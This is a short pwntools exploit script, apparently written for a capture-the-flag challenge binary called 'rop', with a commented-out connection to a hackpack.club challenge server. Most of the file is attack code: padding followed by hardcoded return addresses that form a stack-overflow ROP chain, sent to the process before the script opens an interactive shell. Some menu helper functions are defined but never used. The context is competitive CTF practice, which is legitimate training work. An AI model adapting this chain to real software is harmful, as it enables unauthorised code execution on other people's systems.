#!/usr/bin/python3

from pwn import *

target = './rop'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def insert_book(s1,name,s2,summary):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(s1)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('size:')
    p.sendline(s2)
    p.recvuntil('summary:')
    p.sendline(summary)

def delete_book(bookid):
    p.recvuntil('>>')
    p.sendline('2')
    p.sendline(bookid)

def write_sum(bookid,s1,summary):
    p.recvuntil('>>')
    p.sendline('3')
    p.sendline(bookid)
    p.sendline(s1)
    p.sendline(summary)

def call_fun(bookid):
    p.recvuntil('>>')
    p.sendline('4')
    p.sendline(bookid)

#==========================================================
#           CODE
#==========================================================

p = process(target)#, env={"LD_PRELOAD":"libc.so.6"})

#p = remote('cha.hackpack.club',41702)

#gdb.attach(p)

pl = p32(0x41414141)*7
pl += p32(0x8048430)
pl += p32(0x80486b3)
pl += p32(0x804a03d)



pl2 = p32(0x10101)

print(p.recvuntil('>'))
p.sendline(pl)
sleep(1)
p.sendline(pl2)


p.interactive()
